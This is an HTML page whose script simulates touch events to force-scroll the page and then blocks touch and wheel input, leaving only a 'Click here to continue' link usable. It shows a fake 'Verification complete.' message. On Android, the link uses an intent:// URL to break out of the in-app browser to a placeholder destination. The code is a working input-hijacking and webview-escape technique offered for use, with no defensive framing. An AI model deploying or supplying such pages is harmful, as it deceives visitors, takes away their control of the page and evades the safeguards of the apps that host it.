<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body, html { margin: 0; padding: 0; background: #ffffff; height: 500vh; overscroll-behavior-y: none; }
        
        /* The 300px Invisible Spacer */
        #top-block { height: 300px; background: #ffffff; width: 100%; } 

        #main-content { 
            position: relative;
            padding: 20px; 
            text-align: center; 
            font-family: -apple-system, sans-serif;
        }

        /* The Literal Link */
        #breakout-link {
            color: #0000EE; /* Classic Link Blue */
            text-decoration: underline;
            font-size: 18px;
            cursor: pointer;
            position: relative;
            z-index: 10000;
            display: inline-block;
            margin-top: 250px; /* Positioned below the scroll-stop */
        }

        /* Hitbox: Makes the link easier to click without changing its look */
        #breakout-link::after {
            content: '';
            position: absolute;
            top: -20px; bottom: -20px; left: -20px; right: -20px;
        }

        #shield { 
            display: none; 
            position: fixed; 
            top: 0; left: 0; width: 100%; height: 100%; 
            z-index: 5000;
            pointer-events: none; 
        }
    </style>
</head>
<body>
    <div id="shield"></div>
    <div id="top-block"></div>

    <div id="main-content">
        <p>Verification complete.</p>
        <a id="breakout-link" onclick="executeBreakout()">Click here to continue</a>
    </div>

    <script>
        function createTouchEvent(type, y) {
            return new TouchEvent(type, {
                bubbles: true, cancelable: true,
                touches: [new Touch({ identifier: Date.now(), target: document.body, clientY: y, screenY: y, pageY: y })]
            });
        }

        async function runFinalHijack() {
            const startY = 800, endY = 100, steps = 15, stepDelay = 15;
            document.body.dispatchEvent(createTouchEvent('touchstart', startY));
            for (let i = 0; i <= steps; i++) {
                const currentY = startY - ((startY - endY) * (i / steps));
                document.body.dispatchEvent(createTouchEvent('touchmove', currentY));
                window.scrollBy(0, (startY - endY) / steps);
                await new Promise(r => setTimeout(r, stepDelay));
            }
            document.body.dispatchEvent(createTouchEvent('touchend', endY));
            engageLock();
        }

        function engageLock() {
            document.getElementById('shield').style.display = 'block';
            const prevent = (e) => { 
                // Allow the link and its hitbox to pass through
                if (e.target.id === 'breakout-link') return;
                e.preventDefault(); 
                e.stopPropagation(); 
            };
            ['touchstart', 'touchmove', 'wheel'].forEach(ev => {
                window.addEventListener(ev, prevent, { passive: false, capture: true });
            });
        }

        function executeBreakout() {
            const url = "https://www.google.com"; // Your destination
            if (/Android/i.test(navigator.userAgent)) {
                window.location.href = `intent://${url.replace(/^https?:\/\//, '')}#Intent;scheme=https;action=android.intent.action.VIEW;end`;
            } else {
                window.location.href = url;
            }
        }

        window.onload = () => { setTimeout(runFinalHijack, 150); };
    </script>
</body>
</html>
